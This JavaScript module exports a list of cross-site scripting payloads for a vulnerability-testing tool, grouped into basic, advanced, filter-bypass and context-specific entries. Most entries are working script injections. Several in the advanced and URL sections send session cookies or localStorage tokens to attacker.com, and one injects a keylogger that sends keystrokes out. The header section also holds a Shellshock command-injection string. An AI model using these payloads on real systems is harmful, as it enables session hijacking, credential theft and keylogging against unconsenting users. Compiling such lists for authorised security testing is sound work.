/**
 * XSS (Cross-Site Scripting) Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 *
 * Categories: basic, advanced, filter_bypass, context_html, context_json, context_url, context_header
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "<script>alert(1)</script>",
        description: "Classic script tag injection",
        expected_behavior: "Browser executes alert(1) proving arbitrary JS execution"
    },
    {
        type: "basic",
        payload: "<script>alert(document.cookie)</script>",
        description: "Cookie exfiltration via script tag",
        expected_behavior: "Displays session cookies, proving cookie theft is possible"
    },
    {
        type: "basic",
        payload: "<img src=x onerror=alert(1)>",
        description: "Event handler XSS via broken image",
        expected_behavior: "Image fails to load, onerror fires alert(1)"
    },
    {
        type: "basic",
        payload: "<svg onload=alert(1)>",
        description: "SVG onload event handler XSS",
        expected_behavior: "SVG element loads and fires alert(1)"
    },
    {
        type: "basic",
        payload: "<body onload=alert(1)>",
        description: "Body onload event handler XSS",
        expected_behavior: "Page body triggers alert on load"
    },
    {
        type: "basic",
        payload: "\"><script>alert(1)</script>",
        description: "Attribute breakout into script tag",
        expected_behavior: "Breaks out of HTML attribute, injects script"
    },
    {
        type: "basic",
        payload: "'\"><img src=x onerror=alert(1)>",
        description: "Double-quote and single-quote attribute breakout with img",
        expected_behavior: "Breaks out of both quote styles and fires onerror"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "<svg><script>alert&#40;1&#41;</script></svg>",
        description: "HTML entity encoded parentheses inside SVG script",
        expected_behavior: "SVG processes HTML entities, executes alert(1)"
    },
    {
        type: "advanced",
        payload: "<details/open/ontoggle=\"alert`1`\">",
        description: "HTML5 details element with template literal alert",
        expected_behavior: "Details element opens and triggers ontoggle with tagged template"
    },
    {
        type: "advanced",
        payload: "<input autofocus onfocus=alert(1)>",
        description: "Autofocus input field with onfocus handler",
        expected_behavior: "Input receives focus automatically, fires alert(1)"
    },
    {
        type: "advanced",
        payload: "<video src=_ onloadstart=\"alert(1)\">",
        description: "Video element with onloadstart event",
        expected_behavior: "Video begins loading invalid source, fires onloadstart"
    },
    {
        type: "advanced",
        payload: "<marquee onstart=alert(1)>",
        description: "Marquee element start event XSS",
        expected_behavior: "Marquee starts scrolling and fires alert(1)"
    },
    {
        type: "advanced",
        payload: "<audio src onloadstart=alert(1)>",
        description: "Audio element onloadstart XSS",
        expected_behavior: "Audio element fires onloadstart when it begins loading"
    },
    {
        type: "advanced",
        payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        description: "SVG animate element with onbegin handler",
        expected_behavior: "Animation starts and triggers alert(1)"
    },
    {
        type: "advanced",
        payload: "<div onpointerover=\"alert(1)\">MOVE HERE</div>",
        description: "Pointer event handler on div element",
        expected_behavior: "Mouse pointer over div triggers alert(1)"
    },
    {
        type: "advanced",
        payload: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        description: "Cookie exfiltration via fetch to attacker-controlled server",
        expected_behavior: "Sends victim cookies to attacker URL via fetch API"
    },
    {
        type: "advanced",
        payload: "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>",
        description: "Cookie exfiltration via image beacon",
        expected_behavior: "Creates an image request that sends cookies as URL parameter"
    },
    {
        type: "advanced",
        payload: "<script>document.location='https://attacker.com/?c='+document.cookie</script>",
        description: "Full page redirect with cookie exfiltration",
        expected_behavior: "Redirects victim to attacker site with cookies in URL"
    },
    {
        type: "advanced",
        payload: "<script>var i=new Image();i.src='https://attacker.com/?k='+localStorage.getItem('token')</script>",
        description: "localStorage token theft",
        expected_behavior: "Exfiltrates JWT or auth tokens stored in localStorage"
    },
    {
        type: "advanced",
        payload: "<script>document.onkeypress=function(e){new Image().src='https://attacker.com/?k='+e.key}</script>",
        description: "JavaScript keylogger injection",
        expected_behavior: "Captures all keystrokes and sends them to attacker server"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "<scr<script>ipt>alert(1)</scr<script>ipt>",
        description: "Nested tag bypass for naive tag removal filters",
        expected_behavior: "Filter removes inner <script>, leaving valid outer <script> tag"
    },
    {
        type: "filter_bypass",
        payload: "<script>\\u0061lert(1)</script>",
        description: "Unicode escape sequence bypass",
        expected_behavior: "JS engine interprets \\u0061 as 'a', executing alert(1)"
    },
    {
        type: "filter_bypass",
        payload: "<script>eval('\\x61lert(1)')</script>",
        description: "Hex escape sequence via eval",
        expected_behavior: "eval interprets hex \\x61 as 'a', executing alert(1)"
    },
    {
        type: "filter_bypass",
        payload: "<script>eval(atob('YWxlcnQoMSk='))</script>",
        description: "Base64-encoded payload via atob()",
        expected_behavior: "Decodes base64 'alert(1)' and executes it"
    },
    {
        type: "filter_bypass",
        payload: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        description: "String.fromCharCode bypass for keyword filters",
        expected_behavior: "Constructs 'alert(1)' from char codes, evading string-based filters"
    },
    {
        type: "filter_bypass",
        payload: "<img src=x onerror=\"alert(1)\" />",
        description: "Self-closing img with explicit quote style",
        expected_behavior: "Evades filters looking for <script> tags specifically"
    },
    {
        type: "filter_bypass",
        payload: "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        description: "Uppercase tag with HTML hex entity encoded event handler",
        expected_behavior: "Bypasses lowercase-only filters; browser decodes entities"
    },
    {
        type: "filter_bypass",
        payload: "<svg/onload=alert(1)>",
        description: "SVG without space between tag and attribute",
        expected_behavior: "Browser parses slash as separator, bypassing space-based filters"
    },
    {
        type: "filter_bypass",
        payload: "<svg\x0conload=alert(1)>",
        description: "SVG with form-feed character instead of space",
        expected_behavior: "Form-feed (0x0c) acts as whitespace, bypassing space filters"
    },
    {
        type: "filter_bypass",
        payload: "<object data=\"data:text/html,<script>alert(1)</script>\">",
        description: "XSS via object tag with data: URI",
        expected_behavior: "Object loads data URI containing script, executing alert(1)"
    },
    {
        type: "filter_bypass",
        payload: "<iframe srcdoc=\"<script>alert(1)</script>\">",
        description: "XSS via iframe srcdoc attribute",
        expected_behavior: "Iframe renders HTML from srcdoc, executing injected script"
    },
    {
        type: "filter_bypass",
        payload: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        description: "DOM clobbering / mutation XSS via math+table nesting",
        expected_behavior: "Parser confusion between MathML and HTML causes script execution"
    },
    {
        type: "filter_bypass",
        payload: "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
        description: "Numeric radix conversion bypass — confirm('xss')",
        expected_behavior: "parseInt('confirm',30)==8680439; reconstructs and calls confirm()"
    },
    {
        type: "filter_bypass",
        payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
        description: "Polyglot XSS payload — works in multiple injection contexts",
        expected_behavior: "Fires in href, onclick, event handler, and JS contexts simultaneously"
    },

    // ── CONTEXT: HTML ──────────────────────────────────────────────────────────
    {
        type: "context_html",
        payload: "\" onfocus=\"alert(1)\" autofocus=\"",
        description: "Attribute injection — break out of value, inject onfocus",
        expected_behavior: "Breaks attribute, adds onfocus handler with autofocus trigger"
    },
    {
        type: "context_html",
        payload: "' onfocus='alert(1)' autofocus='",
        description: "Single-quote attribute injection with onfocus",
        expected_behavior: "Breaks single-quoted attribute, injects onfocus handler"
    },
    {
        type: "context_html",
        payload: "\"><svg onload=alert(1)>",
        description: "Break out of double-quoted attribute into SVG",
        expected_behavior: "Closes attribute and tag, injects SVG with onload"
    },
    {
        type: "context_html",
        payload: "</script><script>alert(1)</script>",
        description: "Close existing script block and open new one",
        expected_behavior: "Terminates current script context, injects new script"
    },
    {
        type: "context_html",
        payload: "<!--><img src=x onerror=alert(1)>-->",
        description: "HTML comment breakout with img tag",
        expected_behavior: "Breaks out of HTML comment, injects executable img tag"
    },
    {
        type: "context_html",
        payload: "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
        description: "Hidden input XSS via accesskey (CTRL+SHIFT+X to trigger)",
        expected_behavior: "User presses access key combo, onclick fires alert(1)"
    },
    {
        type: "context_html",
        payload: "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\" style=\"content-visibility:auto\">",
        description: "Hidden input XSS via content-visibility (Chrome 108+/Firefox 130+)",
        expected_behavior: "Content visibility state change fires alert without user interaction"
    },

    // ── CONTEXT: JSON ──────────────────────────────────────────────────────────
    {
        type: "context_json",
        payload: "</script><script>alert(1)</script>",
        description: "Break out of JSON embedded in script tag",
        expected_behavior: "Closes JSON script block and injects new script"
    },
    {
        type: "context_json",
        payload: "\\\"};alert(1);//",
        description: "JSON string escape breakout with comment",
        expected_behavior: "Breaks out of JSON string value, executes alert, comments rest"
    },
    {
        type: "context_json",
        payload: "{\"name\":\"<img src=x onerror=alert(1)>\"}",
        description: "XSS payload inside JSON value rendered as HTML",
        expected_behavior: "If JSON value is rendered unescaped in DOM, img onerror fires"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "javascript:alert(1)",
        description: "JavaScript protocol handler in URL context",
        expected_behavior: "Browser navigates to javascript: URI, executing alert(1)"
    },
    {
        type: "context_url",
        payload: "javascript:alert(document.domain)",
        description: "JavaScript URI revealing current domain (scope verification)",
        expected_behavior: "Proves XSS runs in context of target domain"
    },
    {
        type: "context_url",
        payload: "data:text/html,<script>alert(1)</script>",
        description: "Data URI with HTML containing script",
        expected_behavior: "Browser renders data URI as HTML page with script execution"
    },
    {
        type: "context_url",
        payload: "javascript:void(document.location='https://attacker.com/?c='+document.cookie)",
        description: "JavaScript URI for cookie theft via redirect",
        expected_behavior: "Redirects user to attacker site with session cookies"
    },
    {
        type: "context_url",
        payload: "#\"><img src=/ onerror=alert(2)>",
        description: "DOM-based XSS via URL fragment injection",
        expected_behavior: "Fragment value used in DOM innerHTML leads to img onerror"
    },

    // ── CONTEXT: HEADER ────────────────────────────────────────────────────────
    {
        type: "context_header",
        payload: "<script>alert(1)</script>",
        description: "XSS in error page reflecting Referer/User-Agent header",
        expected_behavior: "If server reflects headers in error pages, script executes"
    },
    {
        type: "context_header",
        payload: "() { :; }; echo 'Content-Type: text/html'; echo '<script>alert(1)</script>'",
        description: "Shellshock + XSS combo in User-Agent / CGI header",
        expected_behavior: "Exploits Shellshock vulnerability to inject XSS via CGI output"
    },
];

module.exports = {
    vulnerability: "xss",
    name: "Cross-Site Scripting (XSS)",
    description: "Payloads for testing reflected, stored, and DOM-based XSS vulnerabilities",
    payloads,
};
